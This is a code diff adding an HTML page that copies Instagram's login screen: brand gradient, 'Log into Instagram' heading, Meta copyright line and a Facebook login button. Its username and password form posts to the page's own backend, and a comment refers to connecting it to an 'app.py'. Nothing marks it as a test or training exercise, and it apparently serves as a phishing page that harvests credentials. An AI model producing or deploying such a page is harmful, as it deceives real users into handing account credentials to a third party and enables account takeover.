@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .instagram-gradient {
+      background: linear-gradient(135deg, #f56040, #c13584, #405de6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+  </style>
+</head>
+<body class="bg-black text-white min-h-screen flex items-center justify-center">
+
+  <div class="w-full max-w-md mx-auto p-6">
+    <!-- Instagram Logo -->
+    <div class="flex justify-center mb-8">
+      <h1 class="text-5xl font-bold instagram-gradient">Instagram</h1>
+    </div>
+
+    <!-- Login Form -->
+    <div class="bg-zinc-900 rounded-xl p-8 shadow-2xl border border-zinc-800">
+      <h2 class="text-center text-xl font-semibold mb-6">Log into Instagram</h2>
+
+      <form id="loginForm" method="POST" class="space-y-4">
+        <!-- Username -->
+        <div>
+          <input
+            type="text"
+            name="username"
+            id="username"
+            placeholder="Username, email or mobile number"
+            class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 transition"
+            required>
+        </div>
+
+        <!-- Password -->
+        <div>
+          <input
+            type="password"
+            name="password"
+            id="password"
+            placeholder="Password"
+            class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 transition"
+            required>
+        </div>
+
+        <!-- Submit Button -->
+        <button
+          type="submit"
+          class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-semibold transition text-lg">
+          Log in
+        </button>
+      </form>
+
+      <div class="text-center mt-4">
+        <a href="#" class="text-blue-400 hover:underline text-sm">Forgot password?</a>
+      </div>
+
+      <div class="relative my-6">
+        <div class="absolute inset-0 flex items-center">
+          <div class="w-full border-t border-zinc-700"></div>
+        </div>
+        <div class="relative flex justify-center text-sm">
+          <span class="bg-zinc-900 px-4 text-zinc-500">OR</span>
+        </div>
+      </div>
+
+      <button class="w-full border border-zinc-700 hover:bg-zinc-800 py-3 rounded-lg flex items-center justify-center gap-2 mb-3">
+        <span>🔵</span>
+        Log in with Facebook
+      </button>
+
+      <p class="text-center text-sm text-zinc-400 mt-6">
+        Don't have an account?
+        <a href="#" class="text-blue-400 hover:underline">Sign up</a>
+      </p>
+    </div>
+
+    <!-- Footer -->
+    <p class="text-center text-xs text-zinc-500 mt-8">
+      © 2026 Instagram from Meta
+    </p>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      // You can remove this alert after connecting to your app.py
+      // e.preventDefault();   ← Uncomment this line if you want to test without submitting
+    });
+  </script>
+</body>
+</html>
